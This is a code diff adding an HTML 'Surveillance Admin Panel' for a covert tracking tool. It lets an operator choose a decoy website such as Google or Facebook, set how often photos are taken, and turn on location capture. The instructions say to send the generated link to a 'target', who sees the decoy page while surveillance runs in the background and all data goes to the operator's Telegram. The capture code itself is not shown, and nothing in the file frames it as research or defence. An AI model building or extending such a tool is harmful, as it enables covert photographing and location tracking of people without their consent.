@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .card h2 {
+            color: #333;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-right: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+        }
+
+        .preview {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .preview-url {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #667eea;
+            margin-top: 10px;
+            word-break: break-all;
+            font-family: monospace;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .feature-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #667eea;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .website-suggestions {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .suggestion-btn {
+            padding: 10px;
+            background: #e9ecef;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+
+        .suggestion-btn:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎛️ Surveillance Admin Panel</h1>
+
+        <!-- Website Configuration -->
+        <div class="card">
+            <h2>🌐 Website Configuration</h2>
+            
+            <div class="form-group">
+                <label>Target Website URL:</label>
+                <input type="url" id="websiteUrl" placeholder="https://www.example.com" value="https://www.google.com">
+            </div>
+
+            <div class="form-group">
+                <label>Quick Select:</label>
+                <div class="website-suggestions">
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.google.com')">Google</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.youtube.com')">YouTube</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.facebook.com')">Facebook</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://twitter.com')">Twitter</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.instagram.com')">Instagram</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.netflix.com')">Netflix</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.amazon.com')">Amazon</button>
+                    <button class="suggestion-btn" onclick="setWebsite('https://www.reddit.com')">Reddit</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Monitoring Settings -->
+        <div class="card">
+            <h2>⚙️ Monitoring Settings</h2>
+
+            <div class="form-group">
+                <label>Capture Interval (seconds):</label>
+                <select id="captureInterval">
+                    <option value="3">3 seconds</option>
+                    <option value="5" selected>5 seconds</option>
+                    <option value="10">10 seconds</option>
+                    <option value="15">15 seconds</option>
+                    <option value="30">30 seconds</option>
+                    <option value="60">60 seconds</option>
+                </select>
+            </div>
+
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <span>Auto Start Monitoring</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoStart" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="feature-item">
+                    <span>Show Control Panel</span>
+                    <label class="switch">
+                        <input type="checkbox" id="showControl">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="feature-item">
+                    <span>Capture Location</span>
+                    <label class="switch">
+                        <input type="checkbox" id="captureLocation" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="feature-item">
+                    <span>High Quality Photos</span>
+                    <label class="switch">
+                        <input type="checkbox" id="highQuality" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- Generate Link -->
+        <div class="card">
+            <h2>🔗 Generated Surveillance Link</h2>
+            
+            <button class="btn btn-primary" onclick="generateConfig()">
+                Generate Configuration
+            </button>
+            
+            <button class="btn btn-success" onclick="copyLink()">
+                📋 Copy Link
+            </button>
+
+            <button class="btn btn-danger" onclick="openInNewTab()">
+                🚀 Open in New Tab
+            </button>
+
+            <div class="preview">
+                <strong>Preview URL:</strong>
+                <div class="preview-url" id="previewUrl">
+                    Configure settings and click "Generate Configuration"
+                </div>
+            </div>
+
+            <div class="preview" style="margin-top: 15px;">
+                <strong>Configuration Code:</strong>
+                <div class="preview-url" id="configCode" style="white-space: pre-wrap;">
+                    // Configuration will appear here
+                </div>
+            </div>
+        </div>
+
+        <!-- Instructions -->
+        <div class="card">
+            <h2>📖 Instructions</h2>
+            <ol style="line-height: 2;">
+                <li>Select target website URL (or choose from quick select)</li>
+                <li>Configure monitoring settings</li>
+                <li>Click "Generate Configuration"</li>
+                <li>Copy the link and send to target OR open in new tab to test</li>
+                <li>Target will see the selected website while surveillance runs in background</li>
+                <li>All data will be sent to your Telegram</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        function setWebsite(url) {
+            document.getElementById('websiteUrl').value = url;
+        }
+
+        function generateConfig() {
+            const config = {
+                targetWebsite: document.getElementById('websiteUrl').value,
+                captureInterval: parseInt(document.getElementById('captureInterval').value) * 1000,
+                showControlPanel: document.getElementById('showControl').checked,
+                autoStart: document.getElementById('autoStart').checked
+            };
+
+            const configCode = `const CONFIG = ${JSON.stringify(config, null, 2)};`;
+            
+            document.getElementById('configCode').textContent = configCode;
+            document.getElementById('previewUrl').textContent = window.location.origin + '/';
+
+            // Save to localStorage for the main page to use
+            localStorage.setItem('surveillanceConfig', JSON.stringify(config));
+
+            alert('✅ Configuration generated! You can now copy the link or open in new tab.');
+        }
+
+        function copyLink() {
+            const url = window.location.origin + '/';
+            navigator.clipboard.writeText(url).then(() => {
+                alert('✅ Link copied to clipboard!');
+            });
+        }
+
+        function openInNewTab() {
+            window.open('/', '_blank');
+        }
+
+        // Load saved config on page load
+        window.onload = () => {
+            const saved = localStorage.getItem('surveillanceConfig');
+            if (saved) {
+                const config = JSON.parse(saved);
+                document.getElementById('websiteUrl').value = config.targetWebsite;
+                document.getElementById('captureInterval').value = config.captureInterval / 1000;
+                document.getElementById('showControl').checked = config.showControlPanel;
+                document.getElementById('autoStart').checked = config.autoStart;
+            }
+        };
+    </script>
+</body>
+</html>
